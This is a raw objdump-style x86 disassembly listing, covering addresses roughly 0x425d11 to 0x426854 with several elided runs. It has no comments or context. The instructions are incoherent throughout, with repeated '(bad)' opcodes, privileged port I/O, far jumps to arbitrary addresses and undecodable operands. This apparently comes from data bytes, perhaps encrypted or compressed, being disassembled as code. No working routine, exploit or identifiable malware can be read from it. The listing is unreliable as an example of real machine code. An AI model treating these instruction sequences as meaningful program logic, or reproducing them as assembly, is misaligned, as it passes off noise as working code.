  425d11:	in     al,0xb
  425d13:	mov    ds:0xdb4a88c7,al
  425d18:	adc    eax,0xeed1a3f2
  425d1d:	dec    edx
  425d1e:	push   edi
  425d1f:	dec    ecx
  425d20:	enter  0xd97f,0x44
  425d24:	add    al,0x48
  425d26:	push   0xc466e1f
  425d2b:	or     cl,BYTE PTR [eax+0x51b21288]
  425d31:	sub    eax,0xeb427468
  425d36:	in     al,dx
  425d37:	inc    BYTE PTR [ebx+0x41a65b4c]
  425d3d:	mov    esp,0x7ea3fd
	...
  425db2:	add    BYTE PTR [eax],al
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	retf   
  425dc1:	sub    ah,bl
  425dc3:	rol    ebp,0x92
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	cmc    
  425dc9:	add    BYTE PTR [eax],al
  425dcb:	add    bl,al
  425dcd:	xchg   ebx,eax
  425dce:	pusha  
  425dcf:	xchg   BYTE PTR [eax],bl
  425dd1:	js     0x425e21
  425dd3:	iret   
  425dd4:	mov    ah,0x4
  425dd6:	int3   
  425dd7:	mov    ds:0x163b9a23,eax
  425ddc:	js     0x425d9b
  425dde:	out    0x84,al
  425de0:	out    dx,al
  425de1:	or     al,0x3
  425de3:	mov    BYTE PTR [edx],bl
  425de5:	rcl    DWORD PTR [ebx],0x3d
  425de8:	into   
  425de9:	mov    cl,0x94
  425deb:	fcomp  QWORD PTR [edi-0xbbdb40c]
  425df1:	mov    ds:0x8b6b485b,eax
  425df6:	mov    ecx,0x5e0ea7cd
  425dfb:	mov    dh,0x65
  425dfd:	push   ebp
  425dfe:	mov    ecx,0x597bb9b3
  425e03:	std    
  425e04:	out    dx,al
  425e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e06:	xor    BYTE PTR [esi],al
  425e08:	imul   edx,ebp,0x6f
  425e0b:	push   ebp
  425e0c:	pop    ds
  425e0d:	mov    DWORD PTR [ebx+0x12],0xbe83a2da
  425e14:	inc    ebx
  425e15:	fdiv   DWORD PTR [eax]
  425e17:	pop    edi
  425e18:	and    al,0x2b
  425e1a:	enter  0xecb2,0x2f
  425e1e:	imul   edx,DWORD PTR [edx+0x16616ac4],0xfffffff7
  425e25:	inc    ebx
  425e26:	mov    ch,0x8f
  425e28:	fwait
  425e29:	ins    BYTE PTR es:[edi],dx
  425e2a:	inc    ebp
  425e2b:	imul   edi,DWORD PTR [bp+di],0xffffff89
  425e2f:	cli    
  425e30:	pop    ds
  425e31:	imul   ebp,DWORD PTR [esi],0x71999f64
  425e37:	pusha  
  425e38:	jecxz  0x425e56
  425e3a:	inc    edx
  425e3b:	jmp    0xb0f8:0x6c2c2625
  425e42:	xchg   edx,eax
  425e43:	add    BYTE PTR [ebx+eax*4-0x1c],bl
  425e47:	push   0xb252f798
  425e4c:	cld    
  425e4d:	xor    cl,BYTE PTR [edi]
  425e4f:	sub    BYTE PTR [eax+0x7726cf56],cl
  425e55:	loop   0x425e26
  425e57:	mov    al,0x2d
  425e59:	push   ebp
  425e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e5b:	cwde   
  425e5c:	and    ebp,DWORD PTR [edx-0x6a]
  425e5f:	cmp    BYTE PTR [edi+0x7b],0x29
  425e63:	loopne 0x425ec7
  425e65:	mov    ?,edi
  425e67:	mov    ds:0x975cc256,eax
  425e6c:	jp     0x425e8e
  425e6e:	sbb    BYTE PTR [ebp+0x772e1e2a],dh
  425e74:	in     al,0x17
  425e76:	mov    al,BYTE PTR [edx+0x74]
  425e79:	add    ah,dl
  425e7b:	or     BYTE PTR [edx],ch
  425e7d:	sub    al,0x2e
  425e7f:	or     cl,BYTE PTR [ebx+0x18]
  425e82:	jecxz  0x425e37
  425e84:	jmp    0x425e44
  425e86:	adc    al,0xc4
  425e88:	gs in  al,0xf0
  425e8b:	(bad)  
  425e8d:	and    al,0x20
  425e8f:	mov    ebp,0xcb1f4b01
  425e94:	cmp    eax,0x1a092ae9
  425e99:	sub    al,0xa2
  425e9b:	fwait
  425e9c:	sub    al,0x6d
  425e9e:	cmp    DWORD PTR [ebp+0x7f],0xffffffb1
  425ea2:	cld    
  425ea3:	dec    edi
  425ea4:	fdiv   DWORD PTR ds:0x84e5
  425ea9:	inc    edi
  425eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425eab:	or     ch,dh
  425ead:	sub    ecx,esp
  425eaf:	fdiv   st(2),st
  425eb1:	out    0xef,al
  425eb3:	sub    ecx,edx
  425eb5:	fld    DWORD PTR ds:0xdbabdd72
  425ebb:	std    
  425ebc:	imul   edi,DWORD PTR [eax+edx*4],0xcd98
	...
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x6e]
  425f41:	imul   DWORD PTR [esp+edx*1+0x193ba]
  425f48:	cmc    
  425f49:	add    BYTE PTR [eax],al
  425f4b:	add    dh,dl
  425f4d:	push   ecx
  425f4e:	out    dx,eax
  425f4f:	add    eax,0x56733b2b
  425f54:	mov    eax,ds:0xcc1bd4d9
  425f59:	es js  0x425fb1
  425f5c:	loopne 0x425fb1
  425f5e:	test   al,0xfa
  425f60:	jnp    0x425f53
  425f62:	dec    ebp
  425f63:	mov    ebx,0xd39a39c0
  425f68:	ret    
  425f69:	in     eax,dx
  425f6a:	mov    dh,0x2b
  425f6c:	es pop eax
  425f6e:	xor    al,0x11
  425f70:	in     eax,0xf0
  425f72:	loope  0x425fa0
  425f74:	mov    ds:0x5f257da,al
  425f79:	xlat   BYTE PTR ds:[ebx]
  425f7a:	mov    eax,0xebd81791
  425f7f:	or     DWORD PTR [esi+ebp*2-0x15],ebp
  425f83:	stc    
  425f84:	jae    0x425f53
  425f86:	test   edx,esp
  425f88:	dec    esp
  425f89:	mov    ah,0x40
  425f8b:	enter  0xc824,0xab
  425f8f:	xchg   ebx,eax
  425f90:	xchg   edi,eax
  425f91:	mov    bl,0xcf
  425f93:	push   edx
  425f94:	cwde   
  425f95:	sub    BYTE PTR [edx+ebp*4],al
  425f98:	xor    BYTE PTR [edx-0x10],0x9b
  425f9c:	mov    ds:0x9d7e9df4,eax
  425fa1:	cs push edi
  425fa3:	add    edi,edx
  425fa5:	pop    esi
  425fa6:	xor    eax,0xa1a42f00
  425fab:	lods   al,BYTE PTR ds:[esi]
  425fac:	nop
  425fad:	mov    ebx,0x93620347
  425fb2:	and    esp,DWORD PTR [edx+0x21a3d6a5]
  425fb8:	push   ecx
  425fb9:	push   esi
  425fba:	inc    esp
  425fbb:	gs mov dh,0x6f
  425fbe:	es pop esp
  425fc0:	xchg   DWORD PTR [esi-0x30dec7c1],eax
  425fc6:	ins    DWORD PTR es:[edi],dx
  425fc7:	lods   eax,DWORD PTR ds:[esi]
  425fc8:	imul   esi,DWORD PTR [esi],0x251aa83a
  425fce:	lock outs dx,DWORD PTR ds:[esi]
  425fd0:	push   ecx
  425fd1:	mov    esi,0x343ccafe
  425fd6:	push   edi
  425fd7:	inc    ecx
  425fd8:	icebp  
  425fd9:	cmp    eax,0xfd8329b5
  425fde:	in     al,0x10
  425fe0:	in     al,dx
  425fe1:	das    
  425fe2:	push   0xffffffab
  425fe4:	out    0xc8,eax
  425fe6:	ficom  DWORD PTR [eax-0x4782e589]
  425fec:	lods   eax,DWORD PTR ds:[esi]
  425fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fee:	scas   eax,DWORD PTR es:[edi]
  425fef:	add    BYTE PTR [esi],ch
  425ff1:	pop    ebp
  425ff2:	or     al,ah
  425ff4:	call   0x7210:0x9b07c4ad
  425ffb:	das    
  425ffc:	adc    DWORD PTR [eax-0x5683868d],eax
  426002:	jae    0x42601f
  426004:	call   0x83ae0a4
  426009:	bound  esi,QWORD PTR ds:0xb791eeb3
  42600f:	adc    BYTE PTR [ebx+0x55b52d13],ch
  426015:	xor    edi,ecx
  426017:	jo     0x425fc0
  426019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42601a:	aam    0xa2
  42601c:	jp     0x42606a
  42601e:	lock rcl DWORD PTR [edi-0x52],0x32
  426023:	les    ebp,FWORD PTR [ebx-0x2c]
  426026:	loopne 0x426096
  426028:	retf   
  426029:	mov    BYTE PTR [ecx],ch
  42602b:	xor    al,0x85
  42602d:	sbb    ebx,DWORD PTR [ebx]
  42602f:	mov    edx,0x18432ca6
  426034:	cmovl  esp,DWORD PTR [eax]
  426037:	int    0x1a
  426039:	mov    ah,0xe3
  42603b:	mov    ah,0x86
  42603d:	cld    
  42603e:	fistp  WORD PTR [esi-0x1c]
	...
  4260b1:	add    BYTE PTR [eax],al
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0xea3e5928
  4260c4:	scas   eax,DWORD PTR es:[edi]
  4260c5:	xchg   esp,eax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	cmc    
  4260c9:	add    BYTE PTR [eax],al
  4260cb:	add    BYTE PTR [ebp+0x59],cl
  4260ce:	jnp    0x42611c
  4260d0:	ficomp DWORD PTR [edx]
  4260d2:	jno    0x426138
  4260d4:	aas    
  4260d5:	xchg   bl,bl
  4260d7:	sbb    al,0x35
  4260d9:	xlat   BYTE PTR ds:[ebx]
  4260da:	mov    bh,0x46
  4260dc:	xchg   edi,eax
  4260dd:	jl     0x426146
  4260df:	imul   ecx,ecx,0x7431a59a
  4260e5:	and    eax,0x9135478e
  4260ea:	pop    eax
  4260eb:	xchg   ebx,eax
  4260ec:	add    dl,al
  4260ee:	push   0xffffffe2
  4260f0:	mov    esi,0x9d6893a7
  4260f5:	aaa    
  4260f6:	pop    edi
  4260f7:	aam    0x5d
  4260f9:	adc    al,0xc8
  4260fb:	add    DWORD PTR [eax+0x7b],edx
  4260fe:	pop    esi
  4260ff:	lds    eax,FWORD PTR [ebx+0xefb42a0]
  426105:	xor    al,0x47
  426107:	inc    edi
  426108:	adc    BYTE PTR ds:0x31c30526,ah
  42610e:	mov    ecx,edi
  426110:	pop    ebp
  426111:	inc    ecx
  426112:	jl     0x426161
  426114:	sub    DWORD PTR [ebx-0x12],esp
  426117:	inc    edx
  426118:	xchg   esp,eax
  426119:	(bad)  
  42611a:	ror    esi,1
  42611c:	les    ecx,FWORD PTR [ecx+0x3c]
  42611f:	xor    ecx,DWORD PTR [ebp+ebp*1+0x22]
  426123:	add    eax,edx
  426125:	out    0x68,eax
  426127:	scas   al,BYTE PTR es:[edi]
  426128:	fucomi st,st(5)
  42612a:	add    al,0xdf
  42612c:	rcr    DWORD PTR [ebx],cl
  42612e:	xchg   esi,eax
  42612f:	scas   eax,DWORD PTR es:[edi]
  426130:	xchg   ebx,eax
  426131:	sbb    edx,DWORD PTR [edi]
  426133:	dec    ebp
  426134:	or     bl,BYTE PTR [ebx-0x227752d1]
  42613a:	in     eax,0x65
  42613c:	(bad)  
  42613d:	cdq    
  42613e:	dec    edi
  42613f:	pop    edx
  426140:	mov    ds:0x3e02887,eax
  426145:	pop    ecx
  426146:	or     al,0xf1
  426148:	lock popf 
  42614a:	pop    edi
  42614b:	fs (bad) 
  42614e:	cld    
  42614f:	repz fild DWORD PTR [edx+0xf]
  426153:	or     DWORD PTR [eax],ebx
  426155:	sbb    BYTE PTR [edx-0x7],ch
  426158:	das    
  426159:	jbe    0x426125
  42615b:	ret    0xd19
  42615e:	call   0xc34b008a
  426163:	jno    0x426114
  426165:	lock je 0x4261c4
  426168:	dec    edi
  426169:	ret    
  42616a:	xchg   DWORD PTR [esi],ebp
  42616c:	(bad)  
  42616d:	fcmovu st,st(4)
  42616f:	xchg   esi,eax
  426170:	cmp    bl,dh
  426172:	data16 sbb bl,BYTE PTR [esp+ecx*4-0x4f]
  426177:	icebp  
  426178:	push   ss
  426179:	out    dx,al
  42617a:	nop
  42617b:	jp     0x42610b
  42617d:	popa   
  42617e:	or     al,0xdb
  426180:	sar    DWORD PTR [edi+0x3],1
  426183:	scas   eax,DWORD PTR es:[edi]
  426184:	in     al,0x97
  426186:	mov    al,ds:0xa57d841c
  42618b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42618c:	popf   
  42618d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42618e:	es mov dh,0x71
  426191:	sbb    bh,BYTE PTR [ebp+0x79]
  426194:	cdq    
  426195:	aaa    
  426196:	rcr    DWORD PTR [edx-0x32],0x89
  42619a:	daa    
  42619b:	ror    DWORD PTR [ecx-0xf],cl
  42619e:	rol    al,1
  4261a0:	(bad)  
  4261a1:	lahf   
  4261a2:	inc    esp
  4261a3:	and    esi,DWORD PTR [ecx+0x75]
  4261a6:	rcl    BYTE PTR [edi-0x16],cl
  4261a9:	lahf   
  4261aa:	xor    BYTE PTR [ebx+0x40],dh
  4261ad:	gs fwait
  4261af:	xchg   BYTE PTR [edx],cl
  4261b1:	dec    ecx
  4261b2:	adc    edi,eax
  4261b4:	rol    BYTE PTR [ecx+0x69],0x47
  4261b8:	mov    cl,0xd6
  4261ba:	fimul  WORD PTR [edx]
  4261bc:	imul   edx,DWORD PTR [ebp+0x7a],0x5ca9
	...
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0xffffffdc
  426241:	fs xchg ebx,eax
  426243:	sub    esp,DWORD PTR [ebp+edx*4+0xf50001]
  42624a:	add    BYTE PTR [eax],al
  42624c:	sub    al,BYTE PTR [eax]
  42624e:	loopne 0x42628a
  426250:	icebp  
  426251:	adc    DWORD PTR [eax-0x2b20a0bb],edx
  426257:	cld    
  426258:	lea    ebp,[ecx+0x762ddb2a]
  42625e:	cmp    eax,0xe1f3fc81
  426263:	jmp    0x42626f
  426265:	or     al,0x6
  426267:	iret   
  426268:	stos   DWORD PTR es:[edi],eax
  426269:	sbb    al,0x3b
  42626b:	test   al,0x91
  42626d:	and    BYTE PTR ds:0xd9da7404,bh
  426273:	and    DWORD PTR [edi+0x66e87cc9],ecx
  426279:	imul   edi
  42627b:	push   ss
  42627c:	imul   ebp,DWORD PTR [ecx],0xfffffff6
  42627f:	sahf   
  426280:	dec    edx
  426281:	or     esi,esp
  426283:	enter  0x9e7a,0x6d
  426287:	adc    eax,0x6f100d73
  42628c:	fcmovu st,st(2)
  42628e:	add    esp,DWORD PTR ds:0xac5e7c9b
  426294:	outs   dx,BYTE PTR ds:[esi]
  426295:	icebp  
  426296:	or     esp,eax
  426298:	out    dx,eax
  426299:	ins    BYTE PTR es:[edi],dx
  42629a:	ret    0xd338
  42629d:	pop    esp
  42629e:	dec    DWORD PTR [ecx+0x19]
  4262a1:	dec    ecx
  4262a2:	ins    DWORD PTR es:[edi],dx
  4262a3:	mov    dh,0xd2
  4262a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262a6:	adc    BYTE PTR [esi],ch
  4262a8:	cli    
  4262a9:	adc    eax,0x44d49fbb
  4262ae:	sbb    eax,DWORD PTR [edx]
  4262b0:	(bad)  
  4262b1:	mov    ebp,0x37b306c
  4262b6:	jle    0x426242
  4262b8:	sar    BYTE PTR [esi+0x3f5c13be],cl
  4262be:	sub    DWORD PTR [ebx+eax*1-0x20],esp
  4262c2:	sbb    DWORD PTR [edi],edx
  4262c4:	jle    0x4262ab
  4262c6:	lods   eax,DWORD PTR ds:[esi]
  4262c7:	ins    BYTE PTR es:[edi],dx
  4262c8:	push   es
  4262c9:	sub    BYTE PTR [ebx],cl
  4262cb:	cmp    al,0x2f
  4262cd:	out    dx,al
  4262ce:	sbb    eax,DWORD PTR [esi-0x6f]
  4262d1:	outs   dx,DWORD PTR ds:[esi]
  4262d2:	dec    eax
  4262d3:	sbb    DWORD PTR [edx],edi
  4262d5:	ret    0x8bf
  4262d8:	icebp  
  4262d9:	sub    eax,0x29c04287
  4262de:	test   DWORD PTR [ebp*4-0x34ead01b],edx
  4262e5:	jnp    0x426346
  4262e7:	in     al,0xbc
  4262e9:	mov    esi,0xab95a5ab
  4262ee:	jmp    0x4f78:0x25b5f75b
  4262f5:	cdq    
  4262f6:	retf   
  4262f7:	mov    dh,0xf4
  4262f9:	shl    DWORD PTR [edx-0x3674a9a8],cl
  4262ff:	cmp    bh,BYTE PTR [ecx]
  426301:	pop    ss
  426302:	test   BYTE PTR [eax-0x3],ch
  426305:	ins    BYTE PTR es:[edi],dx
  426306:	daa    
  426307:	jge    0x4262eb
  426309:	(bad)  
  42630b:	scas   al,BYTE PTR es:[edi]
  42630c:	(bad)  
  42630d:	aas    
  42630e:	stos   BYTE PTR es:[edi],al
  42630f:	inc    edx
  426310:	iret   
  426311:	mov    edi,0x71ed144d
  426316:	xor    BYTE PTR [esi+0x3e],dh
  426319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42631a:	dec    esp
  42631b:	mov    eax,ds:0x554e3f5c
  426320:	jmp    0x2016:0x407250fc
  426327:	call   0x81fdc0ae
  42632c:	out    dx,eax
  42632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42632e:	lds    ebp,FWORD PTR [edi-0x29]
  426331:	inc    esp
  426332:	inc    edx
  426333:	adc    eax,DWORD PTR [esi]
  426335:	lods   al,BYTE PTR ds:[esi]
  426336:	adc    BYTE PTR [ebp+0x15],dl
  426339:	push   0xffffffea
  42633b:	call   0xa3:0xbf85dc07
	...
  4263b2:	add    BYTE PTR [eax],al
  4263b4:	inc    edx
  4263b5:	or     esp,eax
  4263b7:	test   eax,0xeb6fedcf
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	test   BYTE PTR [bx-0x34],0x99
  4263c5:	xchg   esi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	cmc    
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    BYTE PTR [ebx+0x40],ah
  4263ce:	(bad)  
  4263cf:	lss    eax,FWORD PTR [ebx]
  4263d2:	dec    ecx
  4263d3:	call   0x3c27:0x2abcd595
  4263da:	mov    ds:0x2e654774,eax
  4263df:	test   eax,0x8c08bd05
  4263e4:	retf   
  4263e5:	imul   ecx,ecx,0xf
  4263e8:	push   0xffffff98
  4263ea:	adc    al,0x6a
  4263ec:	cmp    al,al
  4263ee:	pop    eax
  4263ef:	lock push eax
  4263f1:	add    eax,0x7388d2fd
  4263f6:	int    0x2c
  4263f8:	dec    ebx
  4263f9:	imul   esi,eax,0xd140c313
  4263ff:	nop
  426400:	adc    al,0x95
  426402:	jo     0x426423
  426404:	sbb    al,0x82
  426406:	loope  0x4263ab
  426408:	leave  
  426409:	out    0x75,al
  42640b:	mov    al,ds:0xc0faba9a
  426410:	lds    edx,FWORD PTR [esi-0x12]
  426413:	xlat   BYTE PTR ds:[ebx]
  426414:	push   ss
  426415:	jle    0x426440
  426417:	mov    ecx,0xe1fa0493
  42641c:	adc    DWORD PTR [edx+eax*8],esi
  42641f:	sti    
  426420:	loop   0x4263ab
  426422:	push   ebp
  426423:	mov    edi,0x429a6291
  426428:	pmaxub mm1,QWORD PTR [ebp-0x5]
  42642c:	adc    bh,ah
  42642e:	cmp    edx,DWORD PTR [esi+0x3592e313]
  426434:	cmp    BYTE PTR [edi],0x44
  426437:	xor    DWORD PTR gs:[esp+ebp*2-0x7588fccd],0xffffffa9
  426440:	sahf   
  426441:	adc    eax,0x73be4fd1
  426446:	mov    bh,0xff
  426448:	(bad)  
  426449:	int3   
  42644a:	xchg   edi,eax
  42644b:	jb     0x4263e0
  42644d:	pop    ebp
  42644e:	sub    ecx,DWORD PTR [eax]
  426450:	out    dx,al
  426451:	mov    ds:0x33249437,eax
  426456:	lahf   
  426457:	cmp    bl,BYTE PTR [ecx]
  426459:	mov    esi,0x8d9285db
  42645e:	leave  
  42645f:	add    al,0x35
  426461:	pop    ebx
  426462:	inc    esp
  426463:	outs   dx,BYTE PTR ds:[esi]
  426464:	pop    esi
  426465:	xchg   edx,ebx
  426467:	int    0xb2
  426469:	mov    ds:0xa7f5d963,eax
  42646e:	test   DWORD PTR [edi-0x74d86bac],ebx
  426474:	mov    edi,0xe8cc035f
  426479:	dec    esp
  42647a:	jle    0x42646e
  42647c:	mov    edx,0x9f9ca628
  426481:	mov    edi,0x3d999180
  426486:	lock xchg DWORD PTR [edx+0x4f],esp
  42648a:	sbb    DWORD PTR [edx-0x54a23f6e],edx
  426490:	into   
  426491:	add    al,0x21
  426493:	ja     0x42647d
  426495:	lock inc edx
  426497:	cwde   
  426498:	pop    ebp
  426499:	mov    ds:0xd985c774,al
  42649e:	aaa    
  42649f:	js     0x4264df
  4264a1:	cmc    
  4264a2:	xchg   ecx,eax
  4264a3:	jo     0x426478
  4264a5:	test   al,0x34
  4264a7:	sub    al,0x35
  4264a9:	jae    0x426456
  4264ab:	dec    esi
  4264ac:	(bad)
  4264b1:	jbe    0x4264e9
  4264b3:	and    ah,BYTE PTR ds:0x6535fdac
  4264b9:	xchg   ebx,eax
  4264ba:	cmp    ch,ch
  4264bc:	push   ds
  4264bd:	cdq    
  4264be:	push   ds
  4264bf:	pop    esp
  4264c0:	mov    BYTE PTR [eax],al
	...
  426532:	add    BYTE PTR [eax],al
  426534:	(bad)  
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	push   esp
  426541:	iret   
  426542:	hlt    
  426543:	scas   eax,DWORD PTR es:[edi]
  426544:	mov    ss,WORD PTR [edi+0xf50001]
  42654a:	add    BYTE PTR [eax],al
  42654c:	std    
  42654d:	xchg   ebx,eax
  42654e:	das    
  42654f:	imul   esi
  426551:	inc    ecx
  426552:	dec    ebp
  426553:	inc    eax
  426554:	or     BYTE PTR [ebx+edx*1+0x69955bbe],0x93
  42655c:	adc    BYTE PTR [ebp+0x667c00be],0x95
  426563:	ret    0x2d98
  426566:	sbb    eax,0xafa684cf
  42656b:	dec    esi
  42656c:	call   0x97e8ee24
  426571:	test   al,0x6
  426573:	fidivr DWORD PTR [ecx+esi*8+0x774d3f55]
  42657a:	pop    ebx
  42657b:	iret   
  42657c:	jecxz  0x4265c3
  42657e:	fwait
  42657f:	les    edx,FWORD PTR [eax+edx*2+0x10]
  426583:	inc    eax
  426584:	aaa    
  426585:	stos   DWORD PTR es:[edi],eax
  426586:	and    esp,eax
  426588:	paddd  mm3,QWORD PTR [ebp+0x29]
  42658c:	rol    BYTE PTR [edx+0x4f1970fa],0x4f
  426593:	sti    
  426594:	inc    esi
  426595:	jecxz  0x42654a
  426597:	aaa    
  426598:	test   eax,0x77bdc5e2
  42659d:	mov    dl,0xf9
  42659f:	add    eax,ebp
  4265a1:	sbb    BYTE PTR [edi+0x43e456a5],ch
  4265a7:	push   cs
  4265a8:	popa   
  4265a9:	into   
  4265aa:	fs cs in al,0xd3
  4265ae:	shl    BYTE PTR [ecx+0x2b],cl
  4265b1:	cmp    eax,0x6afa0ad2
  4265b6:	push   ecx
  4265b7:	mov    WORD PTR [esi+0x33d6abe9],?
  4265bd:	ins    DWORD PTR es:[edi],dx
  4265be:	xor    eax,0xc85ef1d9
  4265c3:	and    al,BYTE PTR [ecx-0x2a30c652]
  4265c9:	gs push esp
  4265cb:	jne    0x426622
  4265cd:	imul   ebx,DWORD PTR [esp+eiz*4-0x608de10c],0x7f
  4265d5:	sub    BYTE PTR ds:0xc3243170,cl
  4265db:	mov    ch,0xa8
  4265dd:	adc    DWORD PTR [ecx+0x58],edi
  4265e0:	jae    0x426568
  4265e2:	sub    ebx,DWORD PTR [ebx+0x510387d7]
  4265e8:	inc    esi
  4265e9:	cld    
  4265ea:	fst    DWORD PTR [ecx-0xaab3102]
  4265f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265f1:	test   DWORD PTR [ecx+0xbc5bc2f],ebp
  4265f7:	jge    0x4265c3
  4265f9:	mov    esp,0x6672b1d7
  4265fe:	mov    esp,0x5fbadba4
  426603:	pop    es
  426604:	push   eax
  426605:	data16 add BYTE PTR [edx-0x26],0x5
  42660a:	jl     0x4265db
  42660c:	adc    DWORD PTR [ebx+0x66],ecx
  42660f:	and    dl,BYTE PTR [ebx]
  426611:	ret    
  426612:	cli    
  426613:	sub    al,0x97
  426615:	mov    dl,0x7c
  426617:	(bad)  
  426618:	sbb    DWORD PTR [esi+0x36c3e6ec],esi
  42661e:	jb     0x426671
  426620:	and    DWORD PTR [ecx+0x1e390956],eax
  426626:	test   al,0x50
  426628:	sub    al,0x76
  42662a:	mov    eax,0xffb79502
  42662f:	push   ecx
  426630:	xchg   bh,ah
  426632:	pop    ds
  426633:	sub    eax,0x6408f1be
  426638:	ins    DWORD PTR es:[edi],dx
  426639:	cmp    DWORD PTR [ecx+0x41],ebx
  42663c:	jmp    0xfdc98695
	...
  4266b1:	add    BYTE PTR [eax],al
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	addr16 aas 
  4266c2:	lea    eax,[ebx+eax*4-0x68]
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	cmc    
  4266c9:	add    BYTE PTR [eax],al
  4266cb:	add    BYTE PTR [ebx-0x1b3a0da4],dh
  4266d1:	ja     0x4266a9
  4266d3:	cmp    al,0xd4
  4266d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266d6:	outs   dx,BYTE PTR ds:[esi]
  4266d7:	pop    es
  4266d8:	inc    edi
  4266d9:	add    DWORD PTR [edx-0x23],edx
  4266dc:	adc    ax,0x7d71
  4266e0:	scas   al,BYTE PTR es:[edi]
  4266e1:	jle    0x426711
  4266e3:	sbb    BYTE PTR [eax+0x65],al
  4266e6:	(bad)  
  4266e7:	xchg   esi,eax
  4266e8:	fwait
  4266e9:	push   edx
  4266ea:	(bad)  
  4266eb:	pusha  
  4266ec:	push   esi
  4266ed:	arpl   WORD PTR [ecx+ebp*1-0x1a7f4d00],sp
  4266f4:	lods   al,BYTE PTR ds:[esi]
  4266f5:	stc    
  4266f6:	repnz cdq 
  4266f8:	mov    edx,0xb7004a62
  4266fd:	pop    es
  4266fe:	mov    DWORD PTR [esi-0x6a999689],edx
  426704:	jmp    0x9fb1ac34
  426709:	mov    bh,0xf5
  42670b:	fcom   DWORD PTR [esi]
  42670d:	sbb    eax,0xfdd13630
  426712:	inc    edx
  426713:	push   ebp
  426714:	stos   DWORD PTR es:[edi],eax
  426715:	das    
  426716:	sub    al,0x51
  426718:	fild   WORD PTR [eax]
  42671a:	jmp    0x4266e1
  42671c:	pop    esi
  42671d:	and    edi,DWORD PTR [eax]
  42671f:	and    esi,DWORD PTR [edi+0x47]
  426722:	outs   dx,DWORD PTR ds:[esi]
  426723:	pop    esp
  426724:	loopne 0x426769
  426726:	aas    
  426727:	inc    esi
  426728:	push   ss
  426729:	leave  
  42672a:	into   
  42672b:	xor    eax,0xbece9076
  426730:	push   es
  426731:	xchg   esi,eax
  426732:	test   dl,dl
  426734:	fstp   TBYTE PTR [ecx-0x312feb18]
  42673a:	push   esp
  42673b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42673c:	dec    ebx
  42673d:	aad    0x6
  42673f:	lock pop ecx
  426741:	mov    al,ds:0x3c61d3e0
  426746:	stos   BYTE PTR es:[edi],al
  426747:	add    al,0xfb
  426749:	jo     0x42674d
  42674b:	cld    
  42674c:	mov    ecx,0x7ae8fcf4
  426751:	imul   ebp,DWORD PTR [eax+0xc],0xd843aa36
  426758:	mov    dh,0xae
  42675a:	fsubr  DWORD PTR [ecx+0x7a782b4]
  426760:	dec    ebp
  426761:	or     eax,0x33440ce7
  426766:	mov    ebx,0xa2696e80
  42676b:	ja     0x426781
  42676d:	mov    bh,0x1e
  42676f:	sar    BYTE PTR [edx+0x408a2578],1
  426775:	mov    edi,0xf412ba26
  42677a:	pusha  
  42677b:	push   es
  42677c:	mov    edi,0x7f562227
  426781:	add    DWORD PTR ds:0xfb93adb1,esi
  426787:	loopne 0x42677b
  426789:	enter  0x8213,0xb1
  42678d:	enter  0x8545,0xc8
  426791:	(bad)  
  426792:	or     al,0x20
  426794:	and    bh,BYTE PTR [edx-0x34]
  426797:	sbb    ebx,esi
  426799:	test   eax,0xf45c41f8
  42679e:	jmp    0xeac:0x38b03566
  4267a5:	int3   
  4267a6:	xchg   DWORD PTR [edx],edi
  4267a8:	aaa    
  4267a9:	and    al,0xd6
  4267ab:	mov    eax,ds:0x6d50e1a4
  4267b0:	adc    BYTE PTR [ecx+0x3a],dh
  4267b3:	fisttp QWORD PTR [ecx+ecx*1+0x3]
  4267b7:	jmp    0x69a81b65
  4267bc:	mov    dl,0x1f
  4267be:	cmp    dh,0xb2
	...
  426831:	add    BYTE PTR [eax],al
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x324c7334],cl
  426843:	or     edi,DWORD PTR [eax-0x67]
  426846:	add    DWORD PTR [eax],eax
  426848:	cmc    
  426849:	add    BYTE PTR [eax],al
  42684b:	add    BYTE PTR [ebp-0x42],ah
  42684e:	imul   edx,DWORD PTR [ecx-0x64],0xfffffff8
  426852:	inc    edx
  426853:	pop    ss
  426854:	sbb    BYTE PTR [ebp-0x77],ah
